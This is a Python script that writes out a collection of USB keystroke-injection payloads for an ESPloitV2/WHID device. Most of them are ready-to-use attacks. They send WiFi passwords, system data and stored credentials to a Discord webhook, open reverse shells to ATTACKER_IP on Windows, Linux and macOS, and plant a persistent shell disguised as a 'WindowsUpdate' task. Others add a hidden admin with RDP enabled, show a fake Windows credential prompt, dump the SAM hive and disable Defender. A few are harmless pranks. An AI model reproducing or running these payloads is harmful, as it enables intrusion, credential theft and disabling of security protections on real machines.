#!/usr/bin/env python
"""Convert all DuckyScript payloads to ESPloitV2 internal format.

DuckyScript -> Internal format mapping:
  GUI r        -> Press:131+114    (LEFT_GUI=131, r=114)
  GUI SPACE    -> Press:131+32     (LEFT_GUI=131, SPACE=32)
  GUI l        -> Press:131+108    (LEFT_GUI=131, l=108)
  CTRL ALT t   -> Press:128+130+116 (LEFT_CTRL=128, LEFT_ALT=130, t=116)
  ALT y        -> Press:130+121    (LEFT_ALT=130, y=121)
  ENTER        -> Press:176        (KEY_RETURN=176)
  STRING text  -> Print:text
  STRING text + ENTER -> PrintLine:text
  DELAY X      -> CustomDelay:X
  REM comment  -> Rem: comment
"""
import os

base = os.path.dirname(os.path.abspath(__file__)) + "/payloads"

payloads = {}

# === RECON & EXFIL ===

payloads["recon-exfil/win-sysinfo-discord.txt"] = """Rem: Cactus WHID Payload - Windows System Info Exfil
Rem: Target - Windows 10/11
Rem: Gathers hostname, username, IP, OS version and sends to Discord webhook
Rem: Replace DISCORD_WEBHOOK_URL_HERE with your webhook URL
CustomDelay:1000
Press:131+114
CustomDelay:500
PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "$info = systeminfo | Out-String; $ip = (Invoke-WebRequest -Uri 'http://ifconfig.me/ip' -UseBasicParsing).Content; $body = @{content=\\"``````$env:COMPUTERNAME | $env:USERNAME | $ip`n$info``````\\"} | ConvertTo-Json; Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body"
"""

payloads["recon-exfil/win-wifi-pass-grabber.txt"] = """Rem: Cactus WHID Payload - WiFi Password Grabber
Rem: Target - Windows 10/11
Rem: Extracts all saved WiFi SSIDs and cleartext passwords, sends to Discord
Rem: Replace DISCORD_WEBHOOK_URL_HERE with your webhook URL
CustomDelay:1000
Press:131+114
CustomDelay:500
PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "$r='';(netsh wlan show profiles)|Select-String '\\:(.+)$'|%{$n=$_.Matches.Groups[1].Value.Trim();$p=(netsh wlan show profile name=$n key=clear)|Select-String 'Key Content\\W+\\:(.+)$';if($p){$r+=\\"$n : $($p.Matches.Groups[1].Value.Trim())`n\\"}};$body=@{content=\\"``````$r``````\\"}|ConvertTo-Json;Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body"
"""

payloads["recon-exfil/win-network-recon.txt"] = """Rem: Cactus WHID Payload - Network Recon Dump
Rem: Target - Windows 10/11
Rem: Runs ipconfig, netstat, arp, route print and exfils to Discord
Rem: Replace DISCORD_WEBHOOK_URL_HERE with your webhook URL
CustomDelay:1000
Press:131+114
CustomDelay:500
PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "$f=\\"$env:TEMP\\nr.txt\\";ipconfig /all > $f; netstat -an >> $f; arp -a >> $f; route print >> $f; $d=Get-Content $f -Raw; $body=@{content=$d.Substring(0,[Math]::Min(1900,$d.Length))}|ConvertTo-Json -Depth 2; Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body; Remove-Item $f"
"""

payloads["recon-exfil/win-software-inventory.txt"] = """Rem: Cactus WHID Payload - Installed Software Inventory
Rem: Target - Windows 10/11
Rem: Enumerates installed software from registry, sends list to Discord
Rem: Replace DISCORD_WEBHOOK_URL_HERE with your webhook URL
CustomDelay:1000
Press:131+114
CustomDelay:500
PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "$s=Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*|Select DisplayName,DisplayVersion|Out-String;$body=@{content=\\"``````$($s.Substring(0,[Math]::Min(1900,$s.Length)))``````\\"}|ConvertTo-Json;Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body"
"""

payloads["recon-exfil/win-geoip-exfil.txt"] = """Rem: Cactus WHID Payload - Public IP and Geolocation
Rem: Target - Windows 10/11
Rem: Grabs public IP, city, region, ISP via ip-api.com and sends to Discord
Rem: Replace DISCORD_WEBHOOK_URL_HERE with your webhook URL
CustomDelay:1000
Press:131+114
CustomDelay:500
PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "$g=Invoke-RestMethod 'http://ip-api.com/json';$msg=\\"IP: $($g.query) | City: $($g.city) | Region: $($g.regionName) | ISP: $($g.isp) | Org: $($g.org)\\";$body=@{content=$msg}|ConvertTo-Json;Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body"
"""

payloads["recon-exfil/win-exfil-to-cactus.txt"] = """Rem: Cactus WHID Payload - Exfil WiFi Creds to Cactus SPIFFS
Rem: Target - Windows 10/11
Rem: Extracts WiFi passwords and sends them back to the Cactus device itself
Rem: Uses the ESPloit /exfiltrate endpoint - no external server needed
CustomDelay:1000
Press:131+114
CustomDelay:500
PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "$r='';(netsh wlan show profiles)|Select-String '\\:(.+)$'|%{$n=$_.Matches.Groups[1].Value.Trim();$p=(netsh wlan show profile name=$n key=clear)|Select-String 'Key Content\\W+\\:(.+)$';if($p){$r+=\\"$n`:$($p.Matches.Groups[1].Value.Trim()),\\"}};Invoke-WebRequest -Uri \\"http://192.168.1.1/exfiltrate?file=wificreds.txt&data=$r\\" -UseBasicParsing"
"""

# === REVERSE SHELLS ===

payloads["reverse-shells/win-ps-revshell.txt"] = """Rem: Cactus WHID Payload - PowerShell Reverse Shell
Rem: Target - Windows 10/11
Rem: PowerShell reverse TCP shell. Listener - nc -lvp 4444
Rem: Replace ATTACKER_IP and 4444 with your listener address/port
CustomDelay:1000
Press:131+114
CustomDelay:500
PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
"""

payloads["reverse-shells/win-persistent-revshell.txt"] = """Rem: Cactus WHID Payload - Persistent Reverse Shell via Scheduled Task
Rem: Target - Windows 10/11
Rem: Creates a scheduled task that fires a PS reverse shell on every logon
Rem: Replace ATTACKER_IP and port 4444 with your listener
CustomDelay:1000
Press:131+114
CustomDelay:500
PrintLine:cmd /c schtasks /create /tn "WindowsUpdate" /tr "powershell -NoP -W Hidden -Exec Bypass -C while(1){try{$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$c.Close()}catch{Start-Sleep 30}}" /sc onlogon /rl highest /f
"""

payloads["reverse-shells/win-add-hidden-admin.txt"] = """Rem: Cactus WHID Payload - Add Hidden Admin + Enable RDP
Rem: Target - Windows 10/11 (requires admin UAC accept)
Rem: Creates a hidden local admin and enables Remote Desktop
Rem: Triggers UAC prompt - ALT y auto-accepts if user has admin rights
CustomDelay:1000
Press:131+114
CustomDelay:500
PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "Start-Process powershell -Verb RunAs -ArgumentList '-NoP -W Hidden -C net user hak5admin P@ssw0rd123! /add; net localgroup administrators hak5admin /add; reg add \\"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\" /v fDenyTSConnections /t REG_DWORD /d 0 /f; netsh advfirewall firewall set rule group=\\"remote desktop\\" new enable=yes'"
CustomDelay:1000
Press:130+121
"""

payloads["reverse-shells/linux-bash-revshell.txt"] = """Rem: Cactus WHID Payload - Linux Bash Reverse Shell
Rem: Target - Linux (Ubuntu, Debian, Kali, etc.)
Rem: Opens terminal via Ctrl+Alt+T and launches bash reverse shell
Rem: Replace ATTACKER_IP and port 4444 with your listener
CustomDelay:1000
Press:128+130+116
CustomDelay:800
PrintLine:nohup bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &
CustomDelay:200
PrintLine:exit
"""

payloads["reverse-shells/macos-python-revshell.txt"] = """Rem: Cactus WHID Payload - macOS Python Reverse Shell
Rem: Target - macOS
Rem: Opens Spotlight then Terminal, runs Python3 reverse shell
Rem: Replace ATTACKER_IP and port 4444 with your listener
CustomDelay:1000
Press:131+32
CustomDelay:500
PrintLine:terminal
CustomDelay:1000
PrintLine:python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])' &
CustomDelay:200
PrintLine:exit
"""

# === CREDENTIAL HARVESTING ===

payloads["credential-harvesting/win-fake-login-prompt.txt"] = """Rem: Cactus WHID Payload - Fake Windows Credential Prompt
Rem: Target - Windows 10/11
Rem: Shows a convincing Windows credential dialog, sends captured creds to Discord
Rem: Replace DISCORD_WEBHOOK_URL_HERE with your webhook URL
CustomDelay:1000
Press:131+114
CustomDelay:500
PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "Add-Type -AssemblyName System.Windows.Forms;$cred=$Host.UI.PromptForCredential('Windows Security','Windows requires your credentials to apply a critical update.',$env:USERNAME,$env:USERDOMAIN);if($cred){$p=$cred.GetNetworkCredential().Password;$body=@{content=\\"Creds: $env:USERDOMAIN\\$env:USERNAME : $p\\"}|ConvertTo-Json;Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body}"
"""

payloads["credential-harvesting/win-credvault-dump.txt"] = """Rem: Cactus WHID Payload - Windows Credential Vault Dump
Rem: Target - Windows 10/11
Rem: Enumerates Windows Credential Manager entries and exfils to Discord
Rem: Replace DISCORD_WEBHOOK_URL_HERE with your webhook URL
CustomDelay:1000
Press:131+114
CustomDelay:500
PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "$v=cmdkey /list | Out-String;$body=@{content=\\"``````$($v.Substring(0,[Math]::Min(1900,$v.Length)))``````\\"}|ConvertTo-Json;Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body"
"""

payloads["credential-harvesting/win-sam-hive-backup.txt"] = """Rem: Cactus WHID Payload - SAM/SYSTEM Registry Hive Backup
Rem: Target - Windows 10/11 (requires admin UAC accept)
Rem: Saves SAM and SYSTEM hives to TEMP for offline hash cracking
CustomDelay:1000
Press:131+114
CustomDelay:500
PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "Start-Process powershell -Verb RunAs -ArgumentList '-NoP -W Hidden -C reg save HKLM\\SAM $env:TEMP\\sam.hiv /y; reg save HKLM\\SYSTEM $env:TEMP\\sys.hiv /y'"
CustomDelay:1000
Press:130+121
"""

payloads["credential-harvesting/win-browser-urls-exfil.txt"] = """Rem: Cactus WHID Payload - Chrome Saved Login URLs Exfil
Rem: Target - Windows 10/11 (Chrome installed)
Rem: Extracts URLs and usernames from Chrome Login Data db, exfils to Discord
Rem: Passwords are DPAPI-encrypted - this grabs the URL+username mapping
Rem: Replace DISCORD_WEBHOOK_URL_HERE with your webhook URL
CustomDelay:1000
Press:131+114
CustomDelay:500
PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "$src=\\"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\\";$dst=\\"$env:TEMP\\ld.db\\";Copy-Item $src $dst -Force;$q='SELECT origin_url,username_value FROM logins WHERE username_value != \\"\\"';$out=& sqlite3.exe $dst $q 2>$null;if(!$out){$out='No sqlite3 or no data'};$body=@{content=\\"``````$($out|Out-String)``````\\"}|ConvertTo-Json;Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body;Remove-Item $dst"
"""

# === UTILITY & DEMO ===

payloads["utility-demo/win-rickroll.txt"] = """Rem: Cactus WHID Payload - Classic Rickroll
Rem: Target - Windows 10/11
Rem: Maxes volume and opens Rick Astley in the default browser
CustomDelay:1000
Press:131+114
CustomDelay:500
PrintLine:powershell -NoP -C "$w=New-Object -ComObject WScript.Shell;for($i=0;$i-lt50;$i++){$w.SendKeys([char]175)};Start-Process 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'"
"""

payloads["utility-demo/win-wallpaper-changer.txt"] = """Rem: Cactus WHID Payload - Wallpaper Changer
Rem: Target - Windows 10/11
Rem: Downloads an image from URL and sets it as desktop wallpaper
Rem: Replace IMAGE_URL_HERE with a direct link to a .jpg image
CustomDelay:1000
Press:131+114
CustomDelay:500
PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "$url='IMAGE_URL_HERE';$path=\\"$env:TEMP\\wp.jpg\\";Invoke-WebRequest -Uri $url -OutFile $path;Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class W{[DllImport(\\"user32.dll\\",CharSet=CharSet.Auto)]public static extern int SystemParametersInfo(int uAction,int uParam,string lpvParam,int fuWinIni);}';[W]::SystemParametersInfo(0x0014,0,$path,0x0003)"
"""

payloads["utility-demo/win-messagebox.txt"] = """Rem: Cactus WHID Payload - Security Alert Message Box
Rem: Target - Windows 10/11
Rem: Pops a Windows message box - good for proof-of-concept demos
CustomDelay:1000
Press:131+114
CustomDelay:500
PrintLine:powershell -NoP -W Hidden -C "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('This device is vulnerable to USB HID injection attacks.','Cactus WHID - Security Alert','OK','Warning')"
"""

payloads["utility-demo/win-disable-defender.txt"] = """Rem: Cactus WHID Payload - Disable Windows Defender RTP
Rem: Target - Windows 10/11 (requires admin UAC accept)
Rem: Disables Defender real-time monitoring for follow-up payload execution
Rem: Triggers UAC prompt - ALT y auto-accepts if user has admin rights
CustomDelay:1000
Press:131+114
CustomDelay:500
PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "Start-Process powershell -Verb RunAs -ArgumentList '-NoP -W Hidden -C Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true'"
CustomDelay:1000
Press:130+121
"""

payloads["utility-demo/macos-rickroll.txt"] = """Rem: Cactus WHID Payload - macOS Rickroll
Rem: Target - macOS
Rem: Opens Safari via Spotlight and navigates to Rick Astley
CustomDelay:1000
Press:131+32
CustomDelay:500
PrintLine:safari
CustomDelay:1500
Press:131+108
CustomDelay:300
PrintLine:https://www.youtube.com/watch?v=dQw4w9WgXcQ
"""

payloads["utility-demo/linux-reverse-shell-oneliner.txt"] = """Rem: Cactus WHID Payload - Linux Netcat Reverse Shell
Rem: Target - Linux
Rem: Opens terminal and runs netcat reverse shell
Rem: Replace ATTACKER_IP and port 4444 with your listener
CustomDelay:1000
Press:128+130+116
CustomDelay:800
PrintLine:rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f &
CustomDelay:200
PrintLine:exit
"""

# Write all payloads
count = 0
for rel_path, content in payloads.items():
    full_path = os.path.join(base, rel_path)
    # Strip leading newline from triple-quoted strings
    c = content.lstrip('\n')
    with open(full_path, 'w', newline='\n') as f:
        f.write(c)
    count += 1
    print(f"  OK: {rel_path}")

print(f"\nConverted {count}/21 payload files to ESPloitV2 internal format")
